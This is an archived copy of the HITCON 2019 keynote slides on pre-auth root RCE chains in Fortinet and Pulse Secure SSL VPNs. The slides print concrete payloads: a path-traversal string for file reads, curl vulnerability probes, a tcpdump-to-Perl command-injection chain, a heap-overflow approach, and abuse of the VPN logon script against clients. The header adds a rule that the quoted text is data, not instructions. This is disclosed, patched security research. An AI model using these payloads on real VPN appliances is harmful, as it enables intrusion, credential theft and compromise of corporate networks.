---
type: Whitepaper
title: d1 s0 r0 keynote
resource: "https://hitcon.org/2019/CMT/slide-files/d1_s0_r0_keynote.pdf"
tags: [whitepaper, webseclist-reference]
generated:
  by: webseclist-refs/1
  at: "2026-08-07T09:50:54+00:00"
status: stable
stale_after: 2027-08-07
sources:
  - id: original
    resource: "https://hitcon.org/2019/CMT/slide-files/d1_s0_r0_keynote.pdf"
    title: d1 s0 r0 keynote
also_at: []
authors: []
canonical_url: ""
cited_by:
  - "2019.md:12"
commit: ""
content_sha256: 1e216e526f7797c153bb562e00a141d81da0f7c1cc02e7247634c823ee1ba11e
depth: full
depth_reason: default
kind: whitepaper
language: ""
licence: unknown
original_url: "https://hitcon.org/2019/CMT/slide-files/d1_s0_r0_keynote.pdf"
published: ""
publisher: ""
publisher_english: ""
raw_sha256: 848c3f42f316942ee97a0b1fde6d9c8adbef2e1d1d35d1f4ae487d7f52e0dfb7
retrieved_from: "https://hitcon.org/2019/CMT/slide-files/d1_s0_r0_keynote.pdf"
retrieved_kind: manual-import
retrieved_utc: "2026-08-07T09:50:54+00:00"
slug: d1-s0-r0-keynote
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# d1 s0 r0 keynote

**d1 s0 r0 keynote** - Author not stated, Publisher not stated.

- Published: date not stated
- Original: <https://hitcon.org/2019/CMT/slide-files/d1_s0_r0_keynote.pdf>
- Preserved from: https://hitcon.org/2019/CMT/slide-files/d1_s0_r0_keynote.pdf (manual-import) on 2026-08-07
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Top 10 Web Hacking Techniques lists, kept so the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

# Slides

Infiltrating Corporate Intranet
Like NSA
Pre-auth RCE on Leading SSL VPNs

Orange Tsai (@orange_8361)
Meh Chang (@mehqq_)
Orange Tsai
• Principal security researcher at DEVCORE
• Captain of HITCON CTF team
• 0day researcher, focusing on
 Web/Application security

    orange_8361
Meh Chang
• Security researcher at DEVCORE
• HITCON & 217 CTF team
• Focus on binary exploitation

    mehqq_
Highlights today
• Pre-auth root RCE exploit chain on Fortinet SSL VPN
  • Hard-core binary exploitation
  • Magic backdoor

• Pre-auth root RCE exploit chain on Pulse Secure SSL VPN
  • Out-of-box web exploitation
  • Highest bug bounty from Twitter ever

• New attack surface to compromise back all your VPN clients
Agenda
• Introduction
• Jailbreak the SSL VPN
• Attack vectors
• Case studies & Demos
• Weaponize the SSL VPN
• Recommendations
SSL VPN
• Trusted by large corporations to protect their assets
• Work with any network environments and firewalls
• Clientless, a web browser can do everything!
                               Intranet
        Browser                SSL VPN
                   SSL/TLS
What if your trusted SSL VPN
         is insecure?
Why focusing on SSL VPN

1. Important corporate assets but a blind-spot
2. Widely used by corporations of all sizes
3. Only few SSL VPN vendors dominate the market
4. Direct Intranet access and must be exposed to outside
Even NSA is hunting bugs on
         SSL VPN
       Think about Equation Group leaks
They are usually forgotten
A silent-fix case

• We accidentally found a pre-auth RCE on Palo Alto SSL VPN
 during our Red Team assessment
• A silent fixed 1-day:
   • No CVE
   • No advisory
   • No official announcement
Hacking Uber as showcase
Response from Palo Alto PSIRT
    Palo Alto Networks does follow coordinated vulnerability disclosure for
    security vulnerabilities that are reported to us by external researchers.
  We do not CVE items found internally and fixed. This issue was previously
    fixed, but if you find something in a current version, please let us know.
High severity CVE statistics
  159




         50

                 26
                            17        13           6

 Cisco   F5   Palo Alto   Citrix   Fortinet   Pulse Secure

                                                 https://nvd.nist.gov
We focus on…
• Pulse Secure SSL VPN
  •   More than 50,000+ servers operating on the Internet
  •   Trusted by large corporations, service providers and government
      entities

• Fortigate SSL VPN
  •   More than 480,000+ servers operating on the Internet
  •   Prevalent among medium-sized enterprises
Let's start hacking
Difficulties for kick-starting

• SSL VPN is a black box and closed source appliance
• All-in-one & Build their own architecture stacks from scratch
• Only restricted shell provided
  • Jailbreak is the prerequisite for further researches
Jailbreak the SSL VPN

• We are not hardware guys :(
  • So we look into the virtual image first

• Analyzing virtual images
  1. Typical virtual images
  2. Encrypted virtual images
Typical virtual images

• If there is no LILO or GRUB password protected, we can just enter
 the Single-User mode
• Mount the .VMDK on your Linux box and modify the filesystem
   • /etc/crontab
   • /etc/ld.so.conf
   • /etc/passwd
   • Many ways…
What if the disk has been
       encrypted?
Encrypted virtual images
     BIOS/MBR

                    • vmlinuz kernel
     LILO/GRUB
      • Stage 1       • Level - Hard
      • Stage 2
                      • Reverse engineering for the win!
   vmlinuz kernel   • /sbin/init
      • zImagea
      • bzImage       • Level - Easy
                      • Memory forensics for the win!
    /sbin/init
The booting process
         BIOS


         LILO


        Kernel


     /sbin/init




   ?????????????????
The booting process
         BIOS


         LILO


        Kernel


     /sbin/init




   ?????????????????
Find the vital point
           BIOS


           LILO


          Kernel


       /sbin/init
                           Memory Forensics

   /home/bin/dsconfig.pl
In-memory patch
          BIOS


          LILO


         Kernel


      /sbin/init
                          Memory Patch

  ///////////////bin/sh
Once we press the Enter…
           BIOS


           LILO


          Kernel


       /sbin/init




   ///////////////bin/sh
Digging at a correct place
Attack vectors

• WebVPN
• Native script language extensions
• Multi-layered architecture problems
WebVPN

• A convenient proxy feature – Portable & Clientless
• Proxy all kinds of traffics through the web browser
  • Supports various protocols
     • HTTP, FTP, TELNET, SSH, SMB, RDP …

  • Handles various web resources
     • WebSocket, JavaScript, Flash, Java Applet …
WebVPN implementation

• Build from scratch
  • Protocols, web resources handling are prone to memory bugs
  • Requires high security awareness
     • Debug function
     • Logging sensitive data
     • Information exposed
WebVPN implementation

• Modify from an open source project
   • Copy the code, copy the bugs
   • Hard to maintain & update & patch

• Call existing libraries
   • Neglect to update
      • Libcurl (2008), Libxml (2009)
Native script language
extensions
• Most SSL VPNs have their own native script
 language extensions
                                                       Web Stack
  • En/Decoding in C/C++     F5 Networks    PHP / C (Apache extension)
                             Cisco          Lua / C (self-implemented server)
  • Type confusion between
                             Pulse Secure   Perl / C++ (self-implemented server)
    languages                Fortigate      Nginx / C (Apache extension)
                             Palo Alto      PHP / C (AppWeb extension)
                             Citrix         PHP / C (self-implemented server)
En/Decoding in C/C++

• String operation is always difficult for C language
  • Buffer size calculation
  • Dangerous functions
  • Misunderstood functions

    ret = snprintf(buf, buf_size, format, …);
    left_buf_size = buf_size – ret;
Type confusion

• Type seems the same but …
• Perl string or C string?
• What TYPE is it?

              my ($var) = @_;
              EXTENSION::C_function($var);
Multi-layered architecture
problems
• Inconsistency between each architecture layer
• Failed patterns
  • Reverse proxy + Java web = Fail
     • Breaking Parser Logic by Orange Tsai from Black Hat USA 2018

  • Customized(C/C++) web server + RESTful API backend
 Failed Patterns

 • ACL bypass on customized C webserver + RESTful backend
   • Abuse Regular Expression greedy mode to bypass path check
      ^/public/images/.+/(front|background)_.+

   • Dispatched to backend PHP engine and access privileged pages


https://sslvpn/public/images/x/front_x/../../../../some.php
            Case studies
Pre-auth remote code execution on Fortigate SSL VPN
Pre-auth remote code execution on Pulse Secure SSL VPN
              Disclaimer
All the CVEs mentioned below have been reported and patched
            by Fortinet, Pulse Secure and Twitter
Fortigate SSL VPN

• All programs and configurations compiled into //bin/init
  • About 500 MB, stripped idb with 85k functions
  • Plenty of function tables

• Customized web daemons
  • Based on apache since 2002
  • Self-implemented apache module
Fortigate web interface
Worth mentioning bugs

• Pre-auth RCE chain
  • CVE-2018-13379: Pre-auth arbitrary file reading
  • CVE-2018-13382: Post-auth heap overflow

• The magic backdoor
  • CVE-2018-13383: Modify any user’s password with a magic key
Arbitrary file reading

• A function reading language json files for users
  • Concatenate strings directly
  • No . . / filter
  • Limited file extension

snprintf(s, 0x40, "/migadmin/lang/%s.json", lang);
   Arbitrary file reading

   • Utilize the feature of snprintf
      • The snprintf() and vsnprintf() functions will write at most size-1 of
       the characters printed into the output string
      • Appended file extension can be stripped!

 lang=/../../../..//////////////////////////////bin/sh
  snprintf(s, 0x40, "/migadmin/lang/%s.json", lang);
/migadmin/lang//../../../..//////////////////////////////bin/sh.json


                                    0x40
An SSL VPN mystery
   Appears in many products …
Excessively detailed session file

• /dev/cmdb/sslvpn_websession
  • Session token
  • IP address
  • User name
  • Plaintext password
WebVPN
WebVPN – HTTP/HTTPS




https://sslvpn:4433/proxy/72ebc8b8/https/devco.re/
WebVPN – HTTP/HTTPS
Heap overflow vulnerability

• HTTP proxy
  • Perform URL rewriting
  • JavaScript parsing
  • memcpy to a 0x2000 heap buffer without length check

        memcpy(buffer, js_url, js_url_len);
Exploitation obstacles

• Unstable heap
  • Multiple connection handling with epoll()
  • Main process and libraries use the same heap – Jemalloc
  • Regularly triggered internal operations unrelated to connection

• Apache additional memory management
  • No free() unless connection ends
Surprise!

Program received signal SIGSEGV, Segmentation fault.
0x00007fb908d12a77 in SSL_do_handshake () from /fortidev4-
x86_64/lib/libssl.so.1.1
2: /x $rax = 0x41414141
1: x/i $pc
=> 0x7fb908d12a77 <SSL_do_handshake+23>: callq *0x60(%rax)
(gdb)
SSL structure (OpenSSL)

• Stores information of each SSL connection
• Ideal target
     Allocation triggered easily
     Size close to JavaScript buffer
     Nearby JavaScript buffer with regular offset (k + N pages)
     Useful structure members
Useful structure members
typedef struct ssl_st SSL;
struct ssl_st {
     int version;
     const SSL_METHOD *method;        //func table
     …
     int (*handshake_func) (SSL *);
};
Mess up connections
                                                Massive
• Overflow SSL structure                      connections
  • Establish massive connections            Normal request     Fortigate
                                    Fuzzer
     • Lots of normal requests                                  SSL VPN
                                             Normal request
     • One overflow request
                                             Overflow request


                                             Normal request
Exploit between connections

                                    Connection 3
               Connection 1


                         Connection 2

LOW                                                HIGH

                   SSL        SSL       SSL

 HEAP MEMORY
Original SSL structure
                                                ssl_accept()


                                   *handshake
          version   method    …                     …
                                      _func



LOW                                                       HIGH

                             SSL     SSL         SSL

 HEAP MEMORY
Trigger JavaScript Parsing
                                                       ssl_accept()


                                          *handshake
                 version   method    …                     …
      Allocate                               _func



LOW                                                              HIGH
        JS
                                    SSL     SSL         SSL
       Buffer

 HEAP MEMORY
   Overflow SSL structure
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA       ssl_accept()


AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
                        *handshake
             version method   …
                           _func
                                       …

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   memcpy(buffer, js_url, js_url_len);
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   LOW
        JS
                                               HIGH

                            SSL SSL SSL
         Buffer
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    HEAP MEMORY
From SEGFAULT to RCE
                                           ssl_accept()

              AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
                                     *handshake
                                   *handshake
              version
              AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
                      method  ……                ……
                                        _func
                                      _func
              AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA


LOW                                                  HIGH
      AAAAAAAAAAAAAAAAAAAAAAAAAA
                             SSL     SSL    SSL
      AAAAAAAAAAAAAAAAAAAAAAAAAA

 HEAP MEMORY
Forge SSL structure
                                                 system()


                                    *handshake
          version    method    …                   …
                                       _func



LOW                                                     HIGH

         JS Buffer            SSL     SSL        SSL

 HEAP MEMORY
Enjoy your shell!

• Send fuzzy connections to meet the condition
  • Daemon may crash multiple times
  • Fortigate owns a reliable watchdog!

• Get a shell in 1~2 minutes
Make your life easier
     Find another Door to get in
MAGIC backdoor

• A “magic” parameter
  • Secret key for reset password
  • Designed for updating outdated password
     • but lack of authentication
               Demo
Pop a root shell from the only exposed HTTPS port
      Demo
https://youtu.be/Aw55HqZW4x0
Pulse Secure SSL VPN

• Pulse Secure was formed a divestiture of Juniper Networks
• Customized web server and architecture stack
• Perl enthusiast - numerous Perl extensions in C++
• LD_PRELOAD all processes with:
  • libsafe.so - Detect and protect against stack smashing attacks
  • libpreload.so - User-mode networking system call hooks
Vulnerabilities we found
• CVE-2019-11510 - Pre-auth arbitrary file reading
• CVE-2019-11538 - Post-auth NFS arbitrary file reading
• CVE-2019-11508 - Post-auth NFS arbitrary file writing
• CVE-2019-11542 - Post-auth stack buffer overflow
• CVE-2019-11539 - Post-auth command injection
• CVE-2019-11540 - XSSI session hijacking
• CVE-2019-11507 - Cross-site scripting
Arbitrary file reading

• CVE-2019-11510 – Webserver-level pre-auth file reading
  • Pulse Secure has introduced a new feature HTML5 Access since
    SSL VPN version 8.2
     • A new solution to access Telnet, SSH and RDP via browsers

  • To handle static resources, Pulse Secure created a new IF-case to
    widen the original strict path validation
Am I affected by this vuln?

• Probably YES!
  • All un-patched versions are vulnerable except the End-of-Life 8.1 code
  $ curl -I 'https://sslvpn/dana-na///css/ds.js'
    HTTP/1.1 400 Invalid Path
  $ curl -I 'https://sslvpn/dana-na///css/ds.js?/dana/html5acc/guacamole/'
    HTTP/1.1 200 OK
What can we extract?

1. Private keys and system configuration(LDAP, RADIUS and SAML…)
2. Hashed user passwords(md5_crypt)
3. Sensitive cookies in WebVPN(ex: Google, Dropbox and iCloud…)
4. Cached user plaintext passwords
What can we extract?

1. Private keys and system configuration(LDAP, RADIUS and SAML…)
2. Hashed user passwords(md5_crypt)
3. Sensitive cookies in WebVPN(ex: Google, Dropbox and iCloud…)
4. Cached user plaintext passwords
  Command Injection

  • CVE-2019-11539 – Post-auth Command Injection

                            /dana-admin/diag/diag.cgi

sub tcpdump_options_syntax_check {
  my $options = shift;
  return $options if system("$TCPDUMP_COMMAND -d $options >/dev/null 2>&1") == 0;
  return undef;
}
Command Injection
Pulse Secure hardenings

• Several hardenings on Pulse Secure SSL VPN…
  1. System integrity check
  2. Read-only filesystem(only /data are writable)
  3. The DSSafe.pm as a safeguard protects Perl from dangerous
     operations
The Perl gatekeeper

• DSSafe.pm
  • A Perl-C extension hooks several Perl functions such as:
     • system, open, popen, exec, backstick…

  • Command-line syntax validation
     • Disallow numerous bad characters - [\&\*\(\)\{\}\[\]\`\;\|\?\n~<>]
     • Re-implement the Linux I/O redirections in Perl
Failed argument injection :(
• TCPDUMP is too old(v3.9.4, Sept 2005) to support post-rotate-command
• Observed Pulse Secure caches Perl template result in:
   • /data/runtime/tmp/tt/*.thtml.ttc
   • No way to generate a polyglot file in both Perl and PCAP format


       >_     /usr/sbin/tcpdump –help

        Usage: tcpdump [-aAdDeflLnNOpqRStuUvxX] [-c count] [-C file_size]
                       [-E algo:secret] [-F file] [-i interface] [-M secret]
                       [-r file] [-s snaplen] [-T type] [-w pcap-file]
                       [-W filecount] [-z postrotate-command]
                       [-y datalinktype] [-Z user] [expression]
Time to dig deeper

• Dig into DSSafe.pm more deeply, we found a flaw in
 command line I/O redirection parsing

                             dssafe_example.pl

   use DSSafe;

   system("tcpdump -d $options >/dev/null 2>&1");
   system("tcpdump -d -h >file >/dev/null 2>&1");   # `file` not   found
   system("tcpdump -d -h >file < >/dev/null 2>&1"); # `file` created
Think out of the box
          STDOUT is uncontrollable
 Could we write a valid Perl by just STDERR?
Think out of the box

 $ tcpdump -d -r '123'
  tcpdump: 123: No such file or directory

 $ tcpdump -d -r '123' 2>&1 | perl -
  syntax error at - line 1, near "123:"
  Execution of - aborted due to compilation errors.
Think out of the box

 $ tcpdump -d -r 'print 123#'
  tcpdump: print 123#: No such file or directory

 $ tcpdump -d -r 'print 123#' 2>&1 | perl –
   123
Perl 101
             Code



tcpdump: print 123#: No such file or directory


GOTO label                  Comment
/usr/sbin/tcpdump -d
 -r'$x="ls",system$x#'
 2>/data/runtime/tmp/tt/setcookie.thtml.ttc
 <
 >/dev/null
 2>&1

                               RCE Exploit
    /usr/sbin/tcpdump -d
1    -r'$x="ls",system$x#'
     2>/data/runtime/tmp/tt/setcookie.thtml.ttc
     <
     >/dev/null
     2>&1             STDERR(2) > /data/runtime/tmp/tt/setcookie.thtml.ttc


                    tcpdump: $x="ls",system$x#: No such file...
    /usr/sbin/tcpdump -d
     -r'$x="ls",system$x#'
2    2>/data/runtime/tmp/tt/setcookie.thtml.ttc
     <
     >/dev/null
     2>&1             STDERR(2) > /data/runtime/tmp/tt/setcookie.thtml.ttc


                    tcpdump: $x="ls",system$x#: No such file...
    /usr/sbin/tcpdump -d
     -r'$x="ls",system$x#'
     2>/data/runtime/tmp/tt/setcookie.thtml.ttc
3    <
     >/dev/null
     2>&1             STDERR(2) > /data/runtime/tmp/tt/setcookie.thtml.ttc


                    tcpdump: $x="ls",system$x#: No such file...
/usr/sbin/tcpdump -d
 -r'$x="ls",system$x#'
 2>/data/runtime/tmp/tt/setcookie.thtml.ttc
  >_   curl https://sslvpn/dana-na/auth/setcookie.cgi

 < boot   bin   home   lib64        mnt       opt   proc   sys   usr   var
  data    etc   lib    lost+found   modules   pkg   sbin   tmp
>/dev/null
  ...

2>&1
Response from Pulse Secure
• Pulse Secure is committed to providing customers with the best Secure Access Solutions
 for Hybrid IT- SSL VPN and takes security vulnerabilities very seriously

• Timeline:
   • This issue was reported to Pulse Secure PSIRT Team on March 22, 2019
   • Pulse Secure fixes all reported issues in short span of time and published the security advisory SA44101 on
     April 24, 2019 with all software updates that address the vulnerabilities for unpatched versions
   • Pulse Secure assigned the CVE’s to all reported vulnerabilities and updated the advisory on April 25, 2019
   • Pulse Secure sent out a reminder to all customers to apply the security patches on June 26, 2019

• Pulse Secure would like to thank DEVCORE Team for reporting this vulnerability to Pulse
 Secure and working toward a coordinated disclosure
Hacking Twitter

• We keep monitoring large corporations who use Pulse Secure
 by fetching the exposed version and Twitter is one of them
• Pulse Secure released the patch on April 25, 2019 and we wait
 30 days for Twitter to upgrade the SSL VPN
Twitter is vulnerable
  $ ./pulse_check.py <mask>.twitter.com
  [*] Date = Thu, 13 Dec 2018 05:34:28 GMT
  [*] Version = 9.0.3.64015
  [*] OK, <mask>.twittr.com is vulnerable
Two-factor authentication

• Bypass the two-factor authentication
  1. Although we can extract cached passwords in plaintext from
     /lmdb/dataa/data.mdb, we still can not do anything :(
  2. Twitter enabled the Roaming Session (enabled by default)
  3. Download the /lmdb/randomVal/data.mdb to dump all session
  4. Forge the user and reuse the session to bypass the 2FA
Restricted admin interface
         However
We only have the hash of admin password in
     sha256(md5_crypt(salt, …))
$20,160
Make the red team more
          Red
Weaponize the SSL VPN

• The old-school method
  • Watering hole / Drive by download
  • Replace SSL VPN agent installer
  • Man-in-the-middle attack
Weaponize the SSL VPN

• The new method to compromise all VPN clients
• Leverage the logon script feature!
  • Execute specified program once the VPN client connected
  • Almost every SSL VPN supports this feature
  • Support Windows, Linux and Mac
         Demo
Compromise all connected VPN clients
      Demo
https://youtu.be/v7JUMb70ON4
Recommendations

• Client certificate authentication
• Multi factors authentication
• Enable full log audit (Be sure to send to out-bound server)
• Subscribe to the vendor's security advisory and keep system
 updated!
Thanks!
 @orange_8361      @mehqq_
 orange@devco.re   meh@devco.re
